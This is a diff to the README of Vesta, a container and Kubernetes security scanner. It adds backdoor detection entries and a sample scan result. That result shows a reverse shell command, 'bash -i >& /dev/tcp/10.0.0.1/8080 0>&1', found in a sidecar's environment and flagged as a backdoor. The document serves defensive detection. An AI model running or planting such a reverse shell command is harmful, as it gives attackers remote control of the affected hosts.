@@ -56,6 +56,7 @@ Vesta is a flexible toolkit which can run on physical machines in different type
 | ✔         | Docker env password check | Check weak password in database.                                         | high/medium               |                                                                                             |
 | ✔         | Image tag check           | Image is not tagged or `latest`.                                         | low                       |                                                                                             |
 | ✔         | Docker History            | Docker layers have some  dangerous commands.                             | high/medium               |                                                                                             |
+| Pending   | Docker Backdoor           | Docker env command has malicious commands.                               | critical/high             |                                                                                             |
 
 ---
 
@@ -82,9 +83,9 @@ Vesta is a flexible toolkit which can run on physical machines in different type
 | ✔         | Kubelet 10255 and Kubectl proxy                          | 10255 port is opening or Kubectl proxy is opening.                         | high/medium/low           |                                                                                             |
 | ✔         | Etcd configuration                                       | Etcd safe configuration checking.                                          | high/medium               |                                                                                             |
 | ✔         | Sidecar configurations                                   | Sidecar has some dangerous configurations.                                 | critical/high/ medium/low |                                                                                             |
-| ✔         | Pod annotation                                           | Pod annotation has some unsafe configurations.                             | high/medium/ low/warning  |                                                                                             | 
+| ✔         | Pod annotation                                           | Pod annotation has some unsafe configurations.                             | high/medium/ low/warning  | [Ref](https://github.com/kvesta/vesta/wiki/Annotation-Checking-References)                  | 
 | ✔         | DaemonSet                                                | DaemonSet has unsafe configurations.                                       | critical/high/ medium/low |                                                                                             |
-| ✔         | Backdoor                                                 | Backdoor Detection                                                         | critical                  | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                              |
+| ✔         | Backdoor                                                 | Backdoor Detection                                                         | critical/high             | [Ref](https://github.com/kvesta/vesta/wiki/Backdoor-Detection)                              |
 
 
 
@@ -234,6 +235,11 @@ Pods:
 |    |                                | sidecar name: vulntest |       | Token:Password123456           | Sidecar EnvFrom       | high     | Sidecar envFrom ConfigMap has  |
 |    |                                | env                            |                                |                       |          | found weak password:           |
 |    |                                |                                |                                |                       |          | 'Password123456'.              |
++    +                                +--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
+|    |                                | sidecar name: sidecartest |    | MALWARE: bash -i >&            | Sidecar Env           | high     | Container 'sidecartest' finds  |
+|    |                                | env                            | /dev/tcp/10.0.0.1/8080 0>&1    |                       |          | high risk content(score:       |
+|    |                                |                                |                                |                       |          | 0.91 out of 1.0), which is a   |
+|    |                                |                                |                                |                       |          | suspect command backdoor.      |
 +----+--------------------------------+--------------------------------+--------------------------------+-----------------------+----------+--------------------------------+
 |  2 | Name: vulntest2 | Namespace:   | sidecar name: vulntest2 |      | CAP_SYS_ADMIN                  | capabilities.add      | critical | There has a potential          |
 |    | default | Status: Running |    | capabilities                   |                                |                       |          | container escape in privileged |
